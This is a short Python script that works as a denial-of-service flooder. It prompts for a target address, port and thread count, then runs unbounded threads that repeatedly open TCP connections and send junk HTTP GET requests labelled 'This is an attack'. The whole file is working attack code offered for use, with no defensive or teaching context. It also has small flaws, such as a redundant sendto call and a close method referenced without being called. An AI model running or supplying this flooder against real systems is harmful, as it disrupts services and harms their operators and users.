#imports
import socket, sys
from threading import Thread

#get Target URL
print ("Target: ")
target = input()

#get Target Port
print ("Port: ")
port = int(input())

#How many threads should be used
print ("Threads: ")
threads = int(input())

if port <= 0:
    print('Error: Port can not be negative or 0')
    sys.exit()

if threads <= 0:
    print('Error: Threads can not be negative or 0')
    sys.exit()


def attack():
    
    while True:
        mysocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            mysocket.connect((target, port))
            mysocket.send(str.encode("GET " + "This is an attack " + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET " + "This is an attack " + "HTTP/1.1 \r\n"), (target, port))
            mysocket.close()

            print('==>Package sent<==')

        except socket.error:
            print('==>ERROR<==')
        mysocket.close



def main():
    print('Starting Attack')
    print('Target: ' + target)
    print('Port: ' + str(port))
    
    for i in range (threads):       
        t = Thread(target=attack)
        t.start()


if __name__ == '__main__':
    main()
